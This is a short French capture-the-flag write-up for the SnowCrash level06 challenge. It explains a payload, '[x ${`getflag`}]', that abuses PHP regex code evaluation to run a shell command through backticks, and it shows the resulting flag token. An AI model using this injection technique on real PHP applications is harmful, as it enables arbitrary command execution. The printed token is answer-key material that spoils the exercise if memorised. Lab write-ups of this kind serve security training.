Créons un fichier temporaire /tmp/t avec le contenu :
```bash
[x ${`getflag`}]
```
- `[x ...]` : délimite le motif reconnu par l'expression régulière.
- ${\`getflag\`} : syntaxe PHP permettant d'exécuter `getflag` en shell via les backticks.

```bash
echo "[x \${\`getflag\`}]" > /tmp/t
```

Puis on exécute le binaire
```bash
level06@SnowCrash:~$ ./level06 /tmp/t
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```